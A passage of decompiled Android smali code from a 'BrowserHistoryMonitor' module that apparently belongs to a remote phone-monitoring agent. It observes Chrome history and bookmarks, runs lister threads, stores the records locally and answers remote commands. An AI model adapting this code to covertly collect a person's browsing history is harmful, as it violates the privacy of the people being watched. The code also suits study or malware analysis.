    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v11

    move-object v7, v0

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 377
    invoke-virtual {v11}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->deactivate()Z

    .line 379
    new-instance v12, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;

    const/4 v2, 0x2

    const-string v1, "content://com.android.chrome.browser/bookmarks"

    .line 381
    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v12

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 388
    invoke-virtual {v12}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->deactivate()Z

    .line 390
    invoke-virtual {v11}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->getUri()Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v10, v1, v9, v11}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 391
    invoke-virtual {v12}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;->getUri()Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v10, v1, v9, v12}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 393
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    invoke-virtual {v1, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 394
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    invoke-virtual {v1, v12}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 404
    :cond_7
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 413
    new-instance v2, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2, v3, v1, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    return v9

    :catch_1
    move-exception v1

    const-string v2, "BrowserHistoryMonitor"

    const-string v3, "Could not create the Dao"

    .line 407
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 408
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    return v8
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 126
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "BrowserHistoryMonitor"

    const-string v2, "install() called."

    .line 127
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/16 v0, 0x12c

    .line 133
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 139
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1
.end method

.method public isDispatchable()Z
    .locals 1

    .line 421
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public isStarted()Z
    .locals 1

    .line 698
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->monitoringStatus:Z

    return v0
.end method

.method protected returnResponse(Lcom/hp/vd/module/IModule;Ljava/lang/reflect/Method;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 4

    .line 710
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object p4

    invoke-virtual {p4}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object p4

    const/4 v0, 0x3

    const/4 v1, 0x0

    if-nez p1, :cond_0

    const-string p1, "BrowserHistoryMonitor"

    const-string p2, "dispatch(): no commandResponseDispatcher found! No resposne will be ever returned."

    .line 713
    invoke-interface {p4, p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    :cond_0
    if-nez p2, :cond_1

    const-string p1, "BrowserHistoryMonitor"

    const-string p2, "dispatch(): no methodDispatchResponse found! No resposne will be ever returned."

    .line 723
    invoke-interface {p4, p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    :cond_1
    const/4 v2, 0x6

    .line 733
    :try_start_0
    new-array v2, v2, [Ljava/lang/Object;

    aput-object p3, v2, v1

    .line 735
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p3

    const/4 v3, 0x1

    aput-object p3, v2, v3

    const/4 p3, 0x2

    aput-object p5, v2, p3

    aput-object p6, v2, v0

    const/4 p3, 0x4

    new-instance p5, Ljava/util/Date;

    invoke-direct {p5}, Ljava/util/Date;-><init>()V

    aput-object p5, v2, p3

    const/4 p3, 0x5

    new-instance p5, Ljava/util/Date;

    invoke-direct {p5}, Ljava/util/Date;-><init>()V

    aput-object p5, v2, p3

    .line 742
    invoke-virtual {p2, p1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception p1

    const-string p2, "BrowserHistoryMonitor"

    const-string p3, "dispatch(): NullPointerException caught while returning response."

    .line 753
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_1
    move-exception p1

    const-string p2, "BrowserHistoryMonitor"

    const-string p3, "dispatch(): InvocationTargetException caught while returning response."

    .line 750
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_0

    :catch_2
    move-exception p1

    const-string p2, "BrowserHistoryMonitor"

    const-string p3, "dispatch(): IllegalAccessException caught while returning response."

    .line 747
    invoke-interface {p4, p2, p3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return v1
.end method

.method public start()Z
    .locals 8

    .line 555
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v6

    .line 557
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "BrowserHistoryMonitor"

    const-string v1, "This module is currently DEactivated."

    .line 558
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 563
    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const-wide/16 v1, 0x3e8

    const/16 v3, 0x15

    const/4 v7, 0x1

    if-gt v0, v3, :cond_2

    .line 574
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v0, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 576
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v0

    if-nez v0, :cond_1

    return v7

    .line 580
    :cond_1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    div-long/2addr v3, v1

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 587
    new-instance v0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryLister;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Ljava/util/ArrayList;Lcom/hp/vd/agent/log/IWriter;)V

    .line 595
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Browser-History-Lister-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    .line 596
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    goto :goto_0

    .line 598
    :cond_2
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-le v0, v3, :cond_5

    const-string v0, "BrowserHistoryMonitor"

    const-string v3, "start(): > LOLLIPOP detected."

    .line 599
    invoke-interface {v6, v0, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 605
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v0, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 607
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v0

    if-nez v0, :cond_3

    const-string v0, "BrowserHistoryMonitor"

    const-string v1, "start(): > LOLLIPOP: interval has not yet expired."

    .line 608
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v7

    :cond_3
    const-string v0, "BrowserHistoryMonitor"

    const-string v3, "start(): > LOLLIPOP: interval has expired!. About to run lister."

    .line 613
    invoke-interface {v6, v0, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 615
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    div-long/2addr v3, v1

    invoke-static {v3, v4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 622
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-nez v0, :cond_4

    const-string v0, "BrowserHistoryMonitor"

    const-string v1, "start(): > LOLLIPOP: lister thread is already running. Skipping it this time."

    .line 623
    invoke-interface {v6, v0, v1, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v7

    .line 636
    :cond_4
    new-instance v0, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0, v1, v2, v3, v6}, Lcom/hp/vd/module/monitor/browser/BrowserHistoryListerPostLollipop;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 643
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Browser-History-Lister-Post-Lollipop-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    .line 644
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 647
    :cond_5
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v0

    if-ne v0, v7, :cond_7

    .line 648
    :cond_6
    new-instance v0, Ljava/lang/Thread;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v2, "Writer-Queue-Browser-History"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    .line 649
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 652
    :cond_7
    iput-boolean v7, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->monitoringStatus:Z

    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 660
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "BrowserHistoryMonitor"

    .line 661
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "stop(): called [version="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "]."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 663
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-gt v1, v2, :cond_0

    const-string v1, "BrowserHistoryMonitor"

    const-string v2, "stop(): running on <= LOLLIPOP, so about to unregister observers."

    .line 664
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 667
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    if-eqz v1, :cond_0

    .line 668
    iget-object v1, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->browserHistoryObservers:Ljava/util/ArrayList;

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 669
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Lcom/hp/vd/module/monitor/browser/BrowserHistoryObserver;

    .line 671
    iget-object v3, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "BrowserHistoryMonitor"

    const-string v3, "stop(): running on <= LOLLIPOP: Exception caught while unregister()ing observers."

    .line 678
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 682
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 683
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 686
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 687
    iget-object v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->listerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_2
    const/4 v0, 0x0

    .line 690
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 7

    .line 150
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "BrowserHistoryMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 153
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const/4 v1, 0x0

    const/4 v2, 0x3

    .line 168
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v3, :cond_2

    if-eqz v0, :cond_1

    const-string p1, "BrowserHistoryMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 184
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_1
    return v1

    .line 194
    :cond_2
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "system"

    .line 196
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v6

    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 194
    invoke-virtual {v4, v5, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 199
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v4, "0"

    const-string v5, "0"

    .line 204
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v6

    iget-object v6, v6, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-gt v6, v2, :cond_3

    const-string p1, "max_history_id"

    .line 205
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    goto :goto_0

    .line 207
    :cond_3
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    const/4 v2, 0x4

    if-lt p1, v2, :cond_4

    .line 208
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildDefaultInputKey()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 209
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/BrowserHistoryMonitor;->buildChromeInputKey()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    :cond_4
    :goto_0
    if-eqz v4, :cond_5

    const-string p1, "history_max_history_id_1"

    .line 213
    invoke-interface {v1, p1, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_5

    const-string p1, "BrowserHistoryMonitor"

    .line 219
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "update(): from the previous module: history_ATTRIBUTE_MAX_HISTORY_ID_1: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, p1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_5
    if-eqz v5, :cond_6

    const-string p1, "history_max_history_id_2"

    .line 227
    invoke-interface {v1, p1, v5}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_6

    const-string p1, "BrowserHistoryMonitor"

    .line 233
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "update(): from the previous module: history_ATTRIBUTE_MAX_HISTORY_ID_2: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, p1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 240
    :cond_6
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    if-eqz v0, :cond_7

    const-string p1, "BrowserHistoryMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 172
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_7
    return v1
.end method
